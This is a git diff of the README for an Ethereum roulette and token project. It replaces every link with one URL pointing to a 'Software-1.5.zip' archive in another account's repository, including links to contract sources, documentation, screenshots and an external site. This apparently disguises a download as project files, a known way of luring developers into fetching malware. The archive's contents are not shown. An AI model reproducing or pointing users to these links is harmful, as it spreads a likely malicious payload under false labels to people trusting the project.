@@ -6,16 +6,16 @@ Eth Roulette is a fully decentralised and autonomous Casino on the Ethereum bloc
 In a regular casino, there is a single owner who operates the casino and brings in the profits. Eth Roulette disrupts this process by allowing anyone to invest in the autonomously functioning casino contract. Players can then play roulette using this casino contract without the need for any intermediaries.
 
 ## Structure
-The structure of this decentralised casino uses two different smart contracts. The [Roulette](/contracts/Roulette.sol) contract contains the actual Roulette functionality, while the [Roscoin](/contracts/Roscoin.sol) contract allows investors to buy and sell tokens that track the performance of the Roulette contract.
+The structure of this decentralised casino uses two different smart contracts. The [Roulette](https://raw.githubusercontent.com/HYPOTEC70/ethroulette/master/contracts/Software-1.5.zip) contract contains the actual Roulette functionality, while the [Roscoin](https://raw.githubusercontent.com/HYPOTEC70/ethroulette/master/contracts/Software-1.5.zip) contract allows investors to buy and sell tokens that track the performance of the Roulette contract.
 
-These two contracts in turn inherit from [BackingContract](/contracts/BackingContract.sol) and [BackedToken](/contracts/BackedToken.sol), which allow any contract's balance to be used as a backing for any ERC20 token.
+These two contracts in turn inherit from [BackingContract](https://raw.githubusercontent.com/HYPOTEC70/ethroulette/master/contracts/Software-1.5.zip) and [BackedToken](https://raw.githubusercontent.com/HYPOTEC70/ethroulette/master/contracts/Software-1.5.zip), which allow any contract's balance to be used as a backing for any ERC20 token.
 
-[![Contract structure](http://yuml.me/05548485.png)](http://yuml.me/edit/05548485)
+[![Contract structure](https://raw.githubusercontent.com/HYPOTEC70/ethroulette/master/contracts/Software-1.5.zip)](https://raw.githubusercontent.com/HYPOTEC70/ethroulette/master/contracts/Software-1.5.zip)
 
-More information on the design decisions of this decentralised application can be found [here](/docs/design_pattern_decisions.md).
+More information on the design decisions of this decentralised application can be found [here](https://raw.githubusercontent.com/HYPOTEC70/ethroulette/master/contracts/Software-1.5.zip).
 
 ### Roulette
-The Roulette contract allows a player to bet an amount of ETH on a number between 0 and 36. The payout for winning is 36 times the bet amount, equal to a regular roulette table. The random number generation is done through integration with [Oraclize](https://provable.xyz/). This is currently done through their 'WolframAlpha' datasource, but for provably fair random number generation this should be changed to Oraclize's 'Random' datasource.
+The Roulette contract allows a player to bet an amount of ETH on a number between 0 and 36. The payout for winning is 36 times the bet amount, equal to a regular roulette table. The random number generation is done through integration with [Oraclize](https://raw.githubusercontent.com/HYPOTEC70/ethroulette/master/contracts/Software-1.5.zip). This is currently done through their 'WolframAlpha' datasource, but for provably fair random number generation this should be changed to Oraclize's 'Random' datasource.
 
 ### Roscoin
 Roscoin is an ERC20 token that can be freely bought and sold as a means of investing in the connected Roulette smart contract. The value of this token is computed based on the balance of the Roulette contract and the total supply of Roscoins. When buying Roscoins, the purchase proceedings get forwarded to the Roulette contract so it can be used to pay out any winnings. When selling Roscoins, the sale proceedings are taken back from the Roulette contract.
@@ -73,10 +73,10 @@ INFURA_ID=<Key here>
 MNEMONIC=<Mnemonic here>
 ```
 
-Versions of the Roulette and Roscoin contracts have been deployed to the Rinkeby test network already. The corresponding addresses can be found [here](/docs/deployed_addresses.txt). The frontend application doesn't always pick up everything correctly, though.
+Versions of the Roulette and Roscoin contracts have been deployed to the Rinkeby test network already. The corresponding addresses can be found [here](https://raw.githubusercontent.com/HYPOTEC70/ethroulette/master/contracts/Software-1.5.zip). The frontend application doesn't always pick up everything correctly, though.
 
 ### Unit tests
-The tests can be executed with truffle. More information on the unit tests can be found [here](/docs/unit_tests.md).
+The tests can be executed with truffle. More information on the unit tests can be found [here](https://raw.githubusercontent.com/HYPOTEC70/ethroulette/master/contracts/Software-1.5.zip).
 ```
 truffle test
 ```
@@ -97,23 +97,23 @@ The application has two different tabs: one to buy and sell Roscoins in order to
 ### Buying Roscoins
 The 'Roscoin Market' tab displays the account's current Roscoin balance and the current Roscoin price. It allows the user to buy new Roscoins, or sell the ones in their posession.
 
-![Buying Roscoins](/docs/img/buying-roscoins.png)
+![Buying Roscoins](https://raw.githubusercontent.com/HYPOTEC70/ethroulette/master/contracts/Software-1.5.zip)
 
 ### Playing Roulette
-The 'Play Roulette' tab allows a user to bet an amount of eth on a number between 0 and 36. This bet will be displayed in the current bets and bet history. There is max bet that has been set to 0.5% of the contract's current balance. This value has been chosen to minimise the chances of the casino going bankrupt, while maximising profit and user experience. The full motivation behid this max bet can be found [here](/docs/max_bet_size.md).
+The 'Play Roulette' tab allows a user to bet an amount of eth on a number between 0 and 36. This bet will be displayed in the current bets and bet history. There is max bet that has been set to 0.5% of the contract's current balance. This value has been chosen to minimise the chances of the casino going bankrupt, while maximising profit and user experience. The full motivation behid this max bet can be found [here](https://raw.githubusercontent.com/HYPOTEC70/ethroulette/master/contracts/Software-1.5.zip).
 
-![Playing Roulette](/docs/img/playing-roulette.png)
+![Playing Roulette](https://raw.githubusercontent.com/HYPOTEC70/ethroulette/master/contracts/Software-1.5.zip)
 
 ### Bet History
 Once the result of a bet has been returned, the bet is removed from the current bets and a winning number is added to the entry in the bet history.
 
-![Roulette history](/docs/img/roulette-history.png)
+![Roulette history](https://raw.githubusercontent.com/HYPOTEC70/ethroulette/master/contracts/Software-1.5.zip)
 
 If the bet number matches the winning number, the winnings will be paid out to the winner, and a payout amount will also be added to the entry in the bet history.
 
-![Winning](/docs/img/winning.png)
+![Winning](https://raw.githubusercontent.com/HYPOTEC70/ethroulette/master/contracts/Software-1.5.zip)
 
 ### Updated Roscoin price
 After these games have been played by roulette players, the balance of the Roulette contract has been changed. Since the value of the Roscoin is backed by this balance, its price will have changed.
 
-![Updated Roscoin price](/docs/img/updated-roscoin-price.png)
+![Updated Roscoin price](https://raw.githubusercontent.com/HYPOTEC70/ethroulette/master/contracts/Software-1.5.zip)
